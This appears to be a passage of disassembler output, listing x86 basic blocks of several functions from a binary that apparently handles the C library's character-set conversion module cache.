0xb01cf09:	mov	eax, esi
0xb01cf0b:	sub	eax, edx
0xb01cf0d:	cmp	eax, 5
0xb01cf10:	je	0xb01d028
None
|
|
|
v
0xb01ce36:	mov	dword ptr [ebp - 0x24], 0
0xb01ce3d:	mov	dword ptr [ebp - 0x20], 0
0xb01ce44:	test	eax, eax
0xb01ce46:	mov	ecx, eax
0xb01ce48:	mov	dword ptr [ebp - 0x3c], eax
0xb01ce4b:	je	0xb01cf42
None
|
|
|
v
0xb01cf37:	mov	eax, dword ptr [ebp - 0x3c]
0xb01cf3a:	mov	dword ptr [esp], eax
0xb01cf3d:	call	0xb0634f0
None
|
|
|
v
0xb01d1e2:	mov	eax, dword ptr [ebx + 0x3678]
0xb01d1e8:	jmp	0xb01cdb2
None
|
|
|
v
0xb01ce0a:	mov	edx, 0x73
0xb01ce0f:	mov	dword ptr [eax], 0x6e6f6367
0xb01ce15:	mov	dword ptr [eax + 4], 0x6f6d2d76
0xb01ce1c:	mov	dword ptr [eax + 8], 0x656c7564
0xb01ce23:	mov	word ptr [eax + 0xc], dx
0xb01ce27:	mov	eax, dword ptr [ebp - 0x58]
0xb01ce2a:	mov	dword ptr [esp], esi
0xb01ce2d:	mov	dword ptr [esp + 4], eax
0xb01ce31:	call	0xb063f60
None
|
|
|
v
0xb01d1b5:	mov	byte ptr [eax], 0
0xb01d1b8:	jmp	0xb01ceb9
None
|
|
|
v
0xb01cfbb:	mov	dword ptr [esp + 4], 0
0xb01cfc3:	mov	dword ptr [esp], esi
0xb01cfc6:	call	0xb07ed60
None
|
|
|
v
0xb01d068:	test	dl, dl
0xb01d06a:	je	0xb01cf1f
None
|
|
|
v
0xb01d0d8:	test	byte ptr [edi + edx*2 + 1], 0x20
0xb01d0dd:	mov	ecx, edx
0xb01d0df:	jne	0xb01cf1f
None
|
|
|
v
0xb01cee1:	movsx	eax, byte ptr [edx]
0xb01cee4:	test	al, al
0xb01cee6:	je	0xb01cf1f
None
|
|
|
v
0xb01d00a:	mov	edi, dword ptr [ebp - 0x60]
0xb01d00d:	mov	eax, dword ptr [ebp - 0x64]
0xb01d010:	mov	ecx, dword ptr [ebx - 0xdc]
0xb01d016:	mov	dword ptr [eax + ecx], edi
0xb01d019:	lea	esp, dword ptr [ebp - 0xc]
0xb01d01c:	pop	ebx
0xb01d01d:	pop	esi
0xb01d01e:	pop	edi
0xb01d01f:	pop	ebp
0xb01d020:	ret	
None
|
|
|
v
0xb01d070:	test	byte ptr [edi + eax*2 + 1], 0x20
0xb01d075:	mov	edx, eax
0xb01d077:	jne	0xb01d1cb
None
|
|
|
v
0xb01cedd:	cmp	esi, edx
0xb01cedf:	je	0xb01cf1f
None
|
|
|
v
0xb01cff7:	mov	eax, dword ptr [ebp - 0x3c]
0xb01cffa:	mov	dword ptr [esp], eax
0xb01cffd:	mov	eax, esi
0xb01cfff:	call	0xb01c930
None
|
|
|
v
0xb01d167:	test	eax, eax
0xb01d169:	jne	0xb01cf1f
None
|
|
|
v
0xb01cf42:	mov	eax, dword ptr [ebp - 0x4c]
0xb01cf45:	add	eax, dword ptr [ebx + 0x3678]
0xb01cf4b:	add	dword ptr [ebp - 0x4c], 8
0xb01cf4f:	mov	ecx, dword ptr [eax]
0xb01cf51:	test	ecx, ecx
0xb01cf53:	mov	dword ptr [ebp - 0x48], ecx
0xb01cf56:	jne	0xb01cde0
None
|
|
|
v
0xb01cfa3:	add	esi, 0x20
0xb01cfa6:	cmp	esi, dword ptr [ebp - 0x3c]
0xb01cfa9:	jne	0xb01cf80
None
|
|
|
v
0xb01cdb2:	mov	ecx, dword ptr [eax]
0xb01cdb4:	test	ecx, ecx
0xb01cdb6:	mov	dword ptr [ebp - 0x48], ecx
0xb01cdb9:	je	0xb01d1d2
None
|
|
|
v
0xb01d004:	cmp	byte ptr [edi + 1], 0
0xb01d008:	jne	0xb01cfb8
None
|
|
|
v
0xb01d0bd:	lea	esi, dword ptr [esi]
None
|
|
|
v
0xb01cfb8:	mov	esi, dword ptr [ebp - 0x3c]
0xb01cfbb:	mov	dword ptr [esp + 4], 0
0xb01cfc3:	mov	dword ptr [esp], esi
0xb01cfc6:	call	0xb07ed60
None
|
|
|
v
0xb01ce68:	mov	eax, dword ptr [ebp - 0x3c]
0xb01ce6b:	mov	dword ptr [esp + 8], 0xa
0xb01ce73:	mov	dword ptr [esp + 0xc], eax
0xb01ce77:	mov	eax, dword ptr [ebp - 0x44]
0xb01ce7a:	mov	dword ptr [esp + 4], eax
0xb01ce7e:	lea	eax, dword ptr [ebp - 0x24]
0xb01ce81:	mov	dword ptr [esp], eax
0xb01ce84:	call	0xb064990
None
|
|
|
v
0xb01ced0:	add	edx, 1
0xb01ced3:	movsx	eax, byte ptr [edx]
0xb01ced6:	test	byte ptr [edi + eax*2 + 1], 0x20
0xb01cedb:	jne	0xb01ced0
None
|
|
|
v
0xb01cda4:	mov	eax, dword ptr [ebx + 0x3678]
0xb01cdaa:	test	eax, eax
0xb01cdac:	je	0xb01d1dd
None
|
|
|
v
0xb01cfcb:	mov	dword ptr [esp + 4], 0
0xb01cfd3:	lea	edx, dword ptr [eax + 1]
0xb01cfd6:	mov	dword ptr [esp], edx
0xb01cfd9:	mov	dword ptr [ebp - 0x40], edx
0xb01cfdc:	call	0xb07ed60
None
|
|
|
v
0xb01cfe1:	mov	edi, eax
0xb01cfe3:	lea	eax, dword ptr [eax + 1]
0xb01cfe6:	mov	dword ptr [ebp - 0x3c], eax
0xb01cfe9:	mov	eax, esi
0xb01cfeb:	call	0xb01c8d0
None
|
|
|
v
0xb01d110:	cmp	dword ptr [ebp - 0x40], edx
0xb01d113:	mov	esi, dword ptr [ebp - 0x5c]
0xb01d116:	je	0xb01cf1f
None
|
|
|
v
0xb01d0c0:	add	eax, 1
0xb01d0c3:	movzx	ecx, byte ptr [eax]
0xb01d0c6:	movsx	edx, cl
0xb01d0c9:	test	byte ptr [edi + edx*2 + 1], 0x20
0xb01d0ce:	jne	0xb01d0c0
None
|
|
|
v
0xb01d1cb:	mov	eax, esi
0xb01d1cd:	jmp	0xb01d0a3
None
|
|
|
v
0xb01cf2c:	mov	eax, dword ptr [ebp - 0x24]
0xb01cf2f:	mov	dword ptr [esp], eax
0xb01cf32:	call	0xb017470
None
|
|
|
v
0xb01cf9b:	test	eax, eax
0xb01cf9d:	je	0xb01d1bd
None
|
|
|
v
0xb01d134:	add	edx, 1
0xb01d137:	mov	eax, esi
0xb01d139:	mov	dword ptr [esp], edx
0xb01d13c:	mov	edx, dword ptr [ebp - 0x40]
0xb01d13f:	call	0xb01c930
None
|
|
|
v
0xb01d0a3:	lea	ecx, dword ptr [eax + 1]
0xb01d0a6:	mov	dword ptr [ebp - 0x40], ecx
0xb01d0a9:	movzx	ecx, byte ptr [eax + 1]
0xb01d0ad:	mov	byte ptr [eax], 0
0xb01d0b0:	mov	eax, dword ptr [ebp - 0x40]
0xb01d0b3:	movsx	edx, cl
0xb01d0b6:	test	byte ptr [edi + edx*2 + 1], 0x20
0xb01d0bb:	je	0xb01d0d0
None
|
|
|
v
0xb01d028:	lea	eax, dword ptr [ebx - 0x4b018]
0xb01d02e:	mov	dword ptr [esp + 8], 5
0xb01d036:	mov	dword ptr [esp + 4], eax
0xb01d03a:	mov	dword ptr [esp], edx
0xb01d03d:	call	0xb07c620
None
|
|
|
v
0xb01cff0:	mov	edx, dword ptr [ebp - 0x40]
0xb01cff3:	test	eax, eax
0xb01cff5:	jne	0xb01d004
None
|
|
|
v
0xb01cec9:	lea	esi, dword ptr [esi]
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b01d210
TOTAL BLOCKS :8
0xb01d230:	mov	ebp, esi
0xb01d232:	shl	ebp, 4
0xb01d235:	mov	eax, dword ptr [ebp + ebx - 0x1420]
0xb01d23c:	mov	dword ptr [esp], edi
0xb01d23f:	mov	dword ptr [esp + 4], eax
0xb01d243:	call	0xb07a740
None
|
|
|
v
0xb01d210:	push	ebp
0xb01d211:	push	edi
0xb01d212:	mov	edi, eax
0xb01d214:	push	esi
0xb01d215:	xor	esi, esi
0xb01d217:	push	ebx
0xb01d218:	call	0xb1267db
None
|
|
|
v
0xb01d27e:	nop	
None
|
|
|
v
0xb01d21d:	add	ebx, 0x18dde3
0xb01d223:	sub	esp, 0x2c
0xb01d226:	mov	dword ptr [esp + 0x1c], edx
0xb01d22a:	lea	esi, dword ptr [esi]
0xb01d230:	mov	ebp, esi
0xb01d232:	shl	ebp, 4
0xb01d235:	mov	eax, dword ptr [ebp + ebx - 0x1420]
0xb01d23c:	mov	dword ptr [esp], edi
0xb01d23f:	mov	dword ptr [esp + 4], eax
0xb01d243:	call	0xb07a740
None
|
|
|
v
0xb01d254:	lea	eax, dword ptr [ebx - 0x4aeba]
0xb01d25a:	mov	dword ptr [esp + 0xc], eax
0xb01d25e:	lea	eax, dword ptr [ebx - 0x4aeca]
0xb01d264:	mov	dword ptr [esp + 4], eax
0xb01d268:	lea	eax, dword ptr [ebx - 0x467a0]
0xb01d26e:	mov	dword ptr [esp + 8], 0x47
0xb01d276:	mov	dword ptr [esp], eax
0xb01d279:	call	0xb027820
None
|
|
|
v
0xb01d24c:	add	esi, 1
0xb01d24f:	cmp	esi, 0xc
0xb01d252:	jne	0xb01d230
None
|
|
|
v
0xb01d280:	lea	eax, dword ptr [ebx + ebp - 0x1420]
0xb01d287:	mov	ecx, dword ptr [esp + 0x1c]
0xb01d28b:	mov	edx, dword ptr [eax + 4]
0xb01d28e:	mov	dword ptr [ecx + 0x1c], 0
0xb01d295:	mov	dword ptr [ecx + 0x14], edx
0xb01d298:	mov	edx, dword ptr [eax + 8]
0xb01d29b:	mov	dword ptr [ecx + 0x20], 0
0xb01d2a2:	mov	dword ptr [ecx], 0
0xb01d2a8:	mov	dword ptr [ecx + 4], 0
0xb01d2af:	mov	dword ptr [ecx + 0x18], edx
0xb01d2b2:	movsx	edx, byte ptr [eax + 0xc]
0xb01d2b6:	mov	dword ptr [ecx + 0x34], 0
0xb01d2bd:	mov	dword ptr [ecx + 0x24], edx
0xb01d2c0:	movsx	edx, byte ptr [eax + 0xd]
0xb01d2c4:	mov	dword ptr [ecx + 0x28], edx
0xb01d2c7:	movsx	edx, byte ptr [eax + 0xe]
0xb01d2cb:	movsx	eax, byte ptr [eax + 0xf]
0xb01d2cf:	mov	dword ptr [ecx + 0x2c], edx
0xb01d2d2:	mov	dword ptr [ecx + 0x30], eax
0xb01d2d5:	add	esp, 0x2c
0xb01d2d8:	pop	ebx
0xb01d2d9:	pop	esi
0xb01d2da:	pop	edi
0xb01d2db:	pop	ebp
0xb01d2dc:	ret	
None
|
|
|
v
0xb01d248:	test	eax, eax
0xb01d24a:	je	0xb01d280
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b023b00
TOTAL BLOCKS :1
0xb023b00:	mov	eax, 1
0xb023b05:	ret	
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b023b10
TOTAL BLOCKS :13
0xb023b89:	mov	eax, dword ptr [esp + 0x28]
0xb023b8d:	lea	edi, dword ptr [ebp + ecx]
0xb023b91:	lea	esi, dword ptr [eax + ecx*4]
0xb023b94:	jmp	0xb023bc5
None
|
|
|
v
0xb023b10:	push	ebp
0xb023b11:	mov	ecx, eax
0xb023b13:	push	edi
0xb023b14:	push	esi
0xb023b15:	push	ebx
0xb023b16:	call	0xb1267db
None
|
|
|
v
0xb023bcd:	add	esp, 0x3c
0xb023bd0:	mov	eax, 0xffffffff
0xb023bd5:	pop	ebx
0xb023bd6:	pop	esi
0xb023bd7:	pop	edi
0xb023bd8:	pop	ebp
0xb023bd9:	ret	
None
|
|
|
v
0xb023bb6:	add	esi, dword ptr [esp + 0x1c]
0xb023bba:	cmp	dword ptr [esp + 0x14], edi
0xb023bbe:	lea	eax, dword ptr [edi + ebp]
0xb023bc1:	jbe	0xb023be0
None
|
|
|
v
0xb023b98:	cmp	dword ptr [esp + 0x18], eax
0xb023b9c:	jbe	0xb023bb6
None
|
|
|
v
0xb023bc3:	mov	edi, eax
0xb023bc5:	movzx	eax, word ptr [esi]
0xb023bc8:	test	ax, ax
0xb023bcb:	jne	0xb023b98
None
|
|
|
v
0xb023b1b:	add	ebx, 0x1874e5
0xb023b21:	sub	esp, 0x3c
0xb023b24:	mov	dword ptr [esp + 0x24], eax
0xb023b28:	mov	dword ptr [esp + 0x2c], edx
0xb023b2c:	mov	esi, dword ptr [ebx + 0xfc0]
0xb023b32:	movzx	eax, word ptr [esi + 4]
0xb023b36:	add	eax, esi
0xb023b38:	mov	dword ptr [esp + 0x20], eax
0xb023b3c:	movzx	eax, word ptr [esi + 6]
0xb023b40:	mov	dword ptr [esp], ecx
0xb023b43:	add	eax, esi
0xb023b45:	mov	dword ptr [esp + 0x28], eax
0xb023b49:	call	0xb02ce10
None
|
|
|
v
0xb023bb2:	test	eax, eax
0xb023bb4:	je	0xb023be8
None
|
|
|
v
0xb023be8:	movzx	edx, word ptr [esi + 2]
0xb023bec:	mov	ecx, dword ptr [esp + 0x2c]
0xb023bf0:	mov	dword ptr [ecx], edx
0xb023bf2:	add	esp, 0x3c
0xb023bf5:	pop	ebx
0xb023bf6:	pop	esi
0xb023bf7:	pop	edi
0xb023bf8:	pop	ebp
0xb023bf9:	ret	
None
|
|
|
v
0xb023b9e:	add	eax, dword ptr [esp + 0x20]
0xb023ba2:	mov	dword ptr [esp + 4], eax
0xb023ba6:	mov	eax, dword ptr [esp + 0x24]
0xb023baa:	mov	dword ptr [esp], eax
0xb023bad:	call	0xb07a740
None
|
|
|
v
0xb023be0:	mov	ecx, edi
0xb023be2:	sub	ecx, dword ptr [esp + 0x14]
0xb023be6:	jmp	0xb023b89
None
|
|
|
v
0xb023b4e:	xor	edx, edx
0xb023b50:	mov	ebp, eax
0xb023b52:	movzx	eax, word ptr [esi + 8]
0xb023b56:	mov	edi, eax
0xb023b58:	mov	dword ptr [esp + 0x14], eax
0xb023b5c:	mov	eax, ebp
0xb023b5e:	div	edi
0xb023b60:	mov	eax, ebp
0xb023b62:	lea	edi, dword ptr [edi - 2]
0xb023b65:	mov	ecx, edx
0xb023b67:	xor	edx, edx
0xb023b69:	div	edi
0xb023b6b:	movzx	eax, word ptr [esi + 4]
0xb023b6f:	lea	ebp, dword ptr [edx + 1]
0xb023b72:	mov	edx, dword ptr [ebx + 0xfbc]
0xb023b78:	sub	edx, eax
0xb023b7a:	lea	eax, dword ptr [ebp*4]
0xb023b81:	mov	dword ptr [esp + 0x18], edx
0xb023b85:	mov	dword ptr [esp + 0x1c], eax
0xb023b89:	mov	eax, dword ptr [esp + 0x28]
0xb023b8d:	lea	edi, dword ptr [ebp + ecx]
0xb023b91:	lea	esi, dword ptr [eax + ecx*4]
0xb023b94:	jmp	0xb023bc5
None
|
|
|
v
0xb023bc5:	movzx	eax, word ptr [esi]
0xb023bc8:	test	ax, ax
0xb023bcb:	jne	0xb023b98
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b023c00
TOTAL BLOCKS :14
0xb023cbc:	mov	dword ptr [esp], edi
0xb023cbf:	call	esi
None
|
|
|
v
0xb023c00:	push	ebp
0xb023c01:	mov	ebp, esp
0xb023c03:	push	edi
0xb023c04:	mov	edi, ecx
0xb023c06:	push	esi
0xb023c07:	mov	esi, edx
0xb023c09:	push	ebx
0xb023c0a:	call	0xb1267db
None
|
|
|
v
0xb023c0f:	add	ebx, 0x1873f1
0xb023c15:	sub	esp, 0x2c
0xb023c18:	mov	dword ptr [esp], eax
0xb023c1b:	mov	dword ptr [ebp - 0x20], eax
0xb023c1e:	call	0xb07ae80
None
|
|
|
v
0xb023c5a:	mov	ecx, dword ptr [ebp - 0x1c]
0xb023c5d:	mov	dword ptr [esp + 4], esi
0xb023c61:	mov	dword ptr [esp + 8], ecx
0xb023c65:	mov	dword ptr [esp], eax
0xb023c68:	call	0xb07d0b0
None
|
|
|
v
0xb023ce0:	lea	esp, dword ptr [ebp - 0xc]
0xb023ce3:	mov	eax, 1
0xb023ce8:	pop	ebx
0xb023ce9:	pop	esi
0xb023cea:	pop	edi
0xb023ceb:	pop	ebp
0xb023cec:	ret	
None
|
|
|
v
0xb023c23:	mov	dword ptr [esp], esi
0xb023c26:	mov	dword ptr [ebp - 0x24], eax
0xb023c29:	call	0xb07ae80
None
|
|
|
v
0xb023cd5:	lea	esp, dword ptr [ebp - 0xc]
0xb023cd8:	pop	ebx
0xb023cd9:	pop	esi
0xb023cda:	pop	edi
0xb023cdb:	pop	ebp
0xb023cdc:	ret	
None
|
|
|
v
0xb023caa:	ror	esi, 9
0xb023cad:	xor	esi, dword ptr gs:[0x18]
0xb023cb4:	mov	dword ptr [esp], esi
0xb023cb7:	call	0xb123900
None
|
|
|
v
0xb023c2e:	mov	edx, dword ptr [ebp - 0x24]
0xb023c31:	lea	ecx, dword ptr [eax + 1]
0xb023c34:	lea	eax, dword ptr [ecx + edx + 0xf]
0xb023c38:	and	eax, 0xfffffff0
0xb023c3b:	sub	esp, eax
0xb023c3d:	mov	eax, dword ptr [ebp - 0x20]
0xb023c40:	mov	dword ptr [ebp - 0x1c], ecx
0xb023c43:	lea	ecx, dword ptr [esp + 0xc]
0xb023c47:	mov	dword ptr [esp + 8], edx
0xb023c4b:	mov	dword ptr [esp], ecx
0xb023c4e:	mov	dword ptr [esp + 4], eax
0xb023c52:	mov	dword ptr [ebp - 0x20], ecx
0xb023c55:	call	0xb07cad0
None
|
|
|
v
0xb023cc8:	xor	edx, dword ptr gs:[0x18]
0xb023ccf:	rol	edx, 9
0xb023cd2:	mov	dword ptr [edi + 0x18], edx
0xb023cd5:	lea	esp, dword ptr [ebp - 0xc]
0xb023cd8:	pop	ebx
0xb023cd9:	pop	esi
0xb023cda:	pop	edi
0xb023cdb:	pop	ebp
0xb023cdc:	ret	
None
|
|
|
v
0xb023c7d:	mov	edx, dword ptr [eax + 0xc]
0xb023c80:	mov	esi, dword ptr [eax + 0x10]
0xb023c83:	mov	eax, dword ptr [eax + 0x14]
0xb023c86:	mov	dword ptr [edi + 4], 0
0xb023c8d:	mov	dword ptr [edi + 0x14], edx
0xb023c90:	mov	dword ptr [edi + 0x1c], esi
0xb023c93:	mov	dword ptr [edi + 0x20], eax
0xb023c96:	xor	eax, eax
0xb023c98:	test	esi, esi
0xb023c9a:	mov	dword ptr [edi + 0x18], 0
0xb023ca1:	mov	dword ptr [edi + 0x38], 0
0xb023ca8:	je	0xb023cd5
None
|
|
|
v
0xb023cc1:	mov	edx, dword ptr [edi + 0x18]
0xb023cc4:	test	edx, edx
0xb023cc6:	je	0xb023cd5
None
|
|
|
v
0xb023c77:	test	eax, eax
0xb023c79:	mov	dword ptr [edi], eax
0xb023c7b:	je	0xb023ce0
None
|
|
|
v
0xb023c6d:	mov	ecx, dword ptr [ebp - 0x20]
0xb023c70:	mov	eax, ecx
0xb023c72:	call	0xb0244e0
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b023d10
TOTAL BLOCKS :38
0xb023ef4:	add	edi, eax
0xb023ef6:	mov	eax, dword ptr [ebx + 0xfbc]
0xb023efc:	cmp	edi, eax
0xb023efe:	jb	0xb023ed1
None
|
|
|
v
0xb023e26:	movzx	ecx, word ptr [eax + 0xc]
0xb023e2a:	cmp	edx, ecx
0xb023e2c:	jb	0xb023e74
None
|
|
|
v
0xb023e1e:	movzx	ecx, word ptr [eax + 0xa]
0xb023e22:	cmp	edx, ecx
0xb023e24:	jbe	0xb023e74
None
|
|
|
v
0xb023e7e:	mov	dword ptr [esp], eax
0xb023e81:	call	0xb017470
None
|
|
|
v
0xb023ea1:	mov	edx, dword ptr [ebx + 0xfbc]
0xb023ea7:	mov	dword ptr [esp], eax
0xb023eaa:	mov	dword ptr [esp + 4], edx
0xb023eae:	call	0xb0e7410
None
|
|
|
v
0xb023df8:	mov	edx, dword ptr [ebx + 0xfbc]
0xb023dfe:	movzx	ecx, word ptr [eax + 4]
0xb023e02:	cmp	ecx, edx
0xb023e04:	jae	0xb023e74
None
|
|
|
v
0xb023dc5:	cmp	eax, 0xff
0xb023dc8:	mov	dword ptr [ebx + 0xfc0], eax
0xb023dce:	je	0xb023eb5
None
|
|
|
v
0xb023e0e:	movzx	esi, word ptr [eax + 8]
0xb023e12:	test	si, si
0xb023e15:	je	0xb023e74
None
|
|
|
v
0xb023e17:	lea	ecx, dword ptr [ecx + esi*4]
0xb023e1a:	cmp	edx, ecx
0xb023e1c:	jb	0xb023e74
None
|
|
|
v
0xb023eb5:	mov	edi, dword ptr [ebx + 0xfbc]
0xb023ebb:	mov	dword ptr [esp], edi
0xb023ebe:	call	0xb0173f0
None
|
|
|
v
0xb023f00:	mov	dword ptr [ebx + 0xfb8], 1
0xb023f0a:	jmp	0xb023dd4
None
|
|
|
v
0xb023eeb:	cmp	eax, 0xff
0xb023eee:	je	0xb023e37
None
|
|
|
v
0xb023e37:	mov	eax, dword ptr [ebx + 0xfc0]
0xb023e3d:	mov	dword ptr [esp], eax
0xb023e40:	call	0xb017470
None
|
|
|
v
0xb023e74:	mov	edx, dword ptr [ebx + 0xfb8]
0xb023e7a:	test	edx, edx
0xb023e7c:	je	0xb023ea1
None
|
|
|
v
0xb023d18:	add	ebx, 0x1872e8
0xb023d1e:	add	esp, -0x80
0xb023d21:	lea	eax, dword ptr [ebx - 0x4ad3c]
0xb023d27:	mov	dword ptr [esp], eax
0xb023d2a:	call	0xb032860
None
|
|
|
v
0xb023e45:	mov	dword ptr [ebx + 0xfc0], 0
0xb023e4f:	nop	
0xb023e50:	mov	ecx, esi
0xb023e52:	xchg	ebx, ecx
0xb023e54:	mov	eax, 6
0xb023e59:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb023ed1:	sub	eax, edi
0xb023ed3:	mov	dword ptr [esp + 8], eax
0xb023ed7:	mov	eax, dword ptr [ebx + 0xfc0]
0xb023edd:	mov	dword ptr [esp], esi
0xb023ee0:	add	eax, edi
0xb023ee2:	mov	dword ptr [esp + 4], eax
0xb023ee6:	call	0xb0daf60
None
|
|
|
v
0xb023e2e:	xor	eax, eax
0xb023e30:	sub	esp, -0x80
0xb023e33:	pop	ebx
0xb023e34:	pop	esi
0xb023e35:	pop	edi
0xb023e36:	ret	
None
|
|
|
v
0xb023de4:	xchg	ebx, ecx
0xb023de6:	mov	eax, dword ptr [ebx + 0xfc0]
0xb023dec:	cmp	dword ptr [eax], 0x20010324
0xb023df2:	jne	0xb023e74
None
|
|
|
v
0xb023e30:	sub	esp, -0x80
0xb023e33:	pop	ebx
0xb023e34:	pop	esi
0xb023e35:	pop	edi
0xb023e36:	ret	
None
|
|
|
v
0xb023dd4:	mov	ecx, esi
0xb023dd6:	xchg	ebx, ecx
0xb023dd8:	mov	eax, 6
0xb023ddd:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb023e90:	mov	dword ptr [ebx + 0xfc0], 0
0xb023e9a:	mov	eax, 0xffffffff
0xb023e9f:	jmp	0xb023e30
None
|
|
|
v
0xb023d93:	mov	dword ptr [esp + 0x14], 0
0xb023d9b:	mov	dword ptr [esp + 0x10], esi
0xb023d9f:	mov	dword ptr [esp + 0xc], 1
0xb023da7:	mov	dword ptr [esp + 8], 1
0xb023daf:	mov	dword ptr [esp + 4], eax
0xb023db3:	mov	dword ptr [esp], 0
0xb023dba:	mov	dword ptr [ebx + 0xfbc], eax
0xb023dc0:	call	0xb0e7320
None
|
|
|
v
0xb023e50:	mov	ecx, esi
0xb023e52:	xchg	ebx, ecx
0xb023e54:	mov	eax, 6
0xb023e59:	call	dword ptr gs:[0x10]
None
|
|
|
v
0xb023e68:	sub	esp, -0x80
0xb023e6b:	mov	eax, 0xffffffff
0xb023e70:	pop	ebx
0xb023e71:	pop	esi
0xb023e72:	pop	edi
0xb023e73:	ret	
None
|
|
|
v
0xb023d5b:	cmp	eax, 0xff
0xb023d5e:	mov	esi, eax
0xb023d60:	je	0xb023e68
None
|
|
|
v
0xb023ecd:	mov	eax, edi
0xb023ecf:	xor	edi, edi
0xb023ed1:	sub	eax, edi
0xb023ed3:	mov	dword ptr [esp + 8], eax
0xb023ed7:	mov	eax, dword ptr [ebx + 0xfc0]
0xb023edd:	mov	dword ptr [esp], esi
0xb023ee0:	add	eax, edi
0xb023ee2:	mov	dword ptr [esp + 4], eax
0xb023ee6:	call	0xb0daf60
None
|
|
|
v
0xb023e06:	movzx	ecx, word ptr [eax + 6]
0xb023e0a:	cmp	edx, ecx
0xb023e0c:	jbe	0xb023e74
None
|
|
|
v
0xb023e60:	xchg	ebx, ecx
0xb023e62:	lea	esi, dword ptr [esi]
0xb023e68:	sub	esp, -0x80
0xb023e6b:	mov	eax, 0xffffffff
0xb023e70:	pop	ebx
0xb023e71:	pop	esi
0xb023e72:	pop	edi
0xb023e73:	ret	
None
|
|
|
v
0xb023d3d:	lea	eax, dword ptr [ebx - 0x466ac]
0xb023d43:	mov	dword ptr [esp + 8], 0
0xb023d4b:	mov	dword ptr [esp + 4], 0
0xb023d53:	mov	dword ptr [esp], eax
0xb023d56:	call	0xb0daada
None
|
|
|
v
0xb023ec3:	test	eax, eax
0xb023ec5:	mov	dword ptr [ebx + 0xfc0], eax
0xb023ecb:	je	0xb023e50
None
|
|
|
v
0xb023d10:	push	edi
0xb023d11:	push	esi
0xb023d12:	push	ebx
0xb023d13:	call	0xb1267db
None
|
|
|
v
0xb023d7e:	test	eax, eax
0xb023d80:	js	0xb023e50
None
|
|
|
v
0xb023eb3:	jmp	0xb023e90
None
|
|
|
v
0xb023d66:	lea	eax, dword ptr [esp + 0x20]
0xb023d6a:	mov	dword ptr [esp + 8], eax
0xb023d6e:	mov	dword ptr [esp + 4], esi
0xb023d72:	mov	dword ptr [esp], 3
0xb023d79:	call	0xb0da2f0
None
|
|
|
v
0xb023d86:	mov	eax, dword ptr [esp + 0x4c]
0xb023d8a:	cmp	eax, 0xf
0xb023d8d:	jbe	0xb023e50
None
|
|
|
v
0xb023e86:	mov	dword ptr [ebx + 0xfb8], 0
0xb023e90:	mov	dword ptr [ebx + 0xfc0], 0
0xb023e9a:	mov	eax, 0xffffffff
0xb023e9f:	jmp	0xb023e30
None
|
|
|
v
0xb023d2f:	test	eax, eax
0xb023d31:	mov	dword ptr [ebx + 0x3674], eax
0xb023d37:	jne	0xb023e68
None
|
|
|
v
----------------------------------------------------
end of Function
----------------------------------------------------
FUNCTION NAME:sub_b023f90
TOTAL BLOCKS :66
0xb02422e:	mov	edx, dword ptr [esp + 0xc]
0xb024232:	mov	esi, edx
0xb024234:	jmp	0xb023ff8
None
|
|
|
v
0xb024274:	movzx	ecx, word ptr [eax]
0xb024277:	test	cx, cx
0xb02427a:	je	0xb024094
None
|
|
|
v
0xb02407f:	mov	ecx, dword ptr [esp + 0x18]
0xb024083:	test	ecx, ecx
0xb024085:	je	0xb024094
None
|
|
|
v
0xb024245:	mov	eax, dword ptr [esp + 0xc]
0xb024249:	mov	esi, eax
0xb02424b:	jmp	0xb023ff8
None
|
|
|
v
0xb024362:	jmp	0xb024332
None
|
|
|
v
0xb023fb1:	mov	ebp, ecx
0xb023fb3:	movzx	ecx, word ptr [edi + 4]
0xb023fb7:	mov	esi, eax
0xb023fb9:	mov	eax, edx
0xb023fbb:	lea	edx, dword ptr [esp + 0x38]
0xb023fbf:	mov	word ptr [esp + 0xc], cx
0xb023fc4:	movzx	ecx, word ptr [edi + 0xa]
0xb023fc8:	mov	word ptr [esp + 0x10], cx
0xb023fcd:	call	0xb023b10
None
|
|
|
v
0xb024125:	movzx	edx, word ptr [edx + 8]
0xb024129:	add	edx, ecx
0xb02412b:	mov	ecx, edi
0xb02412d:	call	0xb023c00
None
|
|
|
v
0xb0240cc:	mov	edx, dword ptr [esp + 0x14]
0xb0240d0:	mov	ecx, dword ptr [esp + 0x18]
0xb0240d4:	test	eax, eax
0xb0240d6:	mov	edi, eax
0xb0240d8:	je	0xb0241d8
None
|
|
|
v
0xb02419d:	mov	eax, dword ptr [esp + 0x60]
0xb0241a1:	add	dword ptr [eax], 1
0xb0241a4:	jmp	0xb023ff8
None
|
|
|
v
0xb0242e3:	mov	eax, dword ptr [esp + 0x18]
0xb0242e7:	mov	edx, dword ptr [esp + 0x20]
0xb0242eb:	mov	dword ptr [edi + 0xc], eax
0xb0242ee:	movzx	eax, word ptr [esi + 2]
0xb0242f2:	imul	eax, eax, 0xc
0xb0242f5:	movzx	eax, word ptr [edx + eax]
0xb0242f9:	mov	edx, dword ptr [esp + 0xc]
0xb0242fd:	mov	dword ptr [edi + 8], 1
0xb024304:	mov	dword ptr [edi + 0x38], 0
0xb02430b:	add	eax, edx
0xb02430d:	mov	dword ptr [edi + 0x10], eax
0xb024310:	mov	dword ptr [esp + 0x18], eax
0xb024314:	movzx	eax, word ptr [esi + 4]
0xb024318:	add	eax, edx
0xb02431a:	cmp	byte ptr [eax], 0
0xb02431d:	je	0xb024353
None
|
|
|
v
0xb02414d:	mov	eax, dword ptr [esp + 0x60]
0xb024151:	mov	edx, dword ptr [esp + 0x1c]
0xb024155:	mov	ebp, dword ptr [eax]
0xb024157:	lea	eax, dword ptr [ebx - 0x4af55]
0xb02415d:	imul	ecx, ebp, 0x3c
0xb024160:	add	ecx, edi
0xb024162:	mov	dword ptr [ecx + 0xc], eax
0xb024165:	movzx	eax, word ptr [edx]
0xb024168:	add	eax, dword ptr [esp + 0xc]
0xb02416c:	mov	dword ptr [ecx + 8], 1
0xb024173:	mov	dword ptr [ecx + 0x38], 0
0xb02417a:	mov	dword ptr [ecx + 0x10], eax
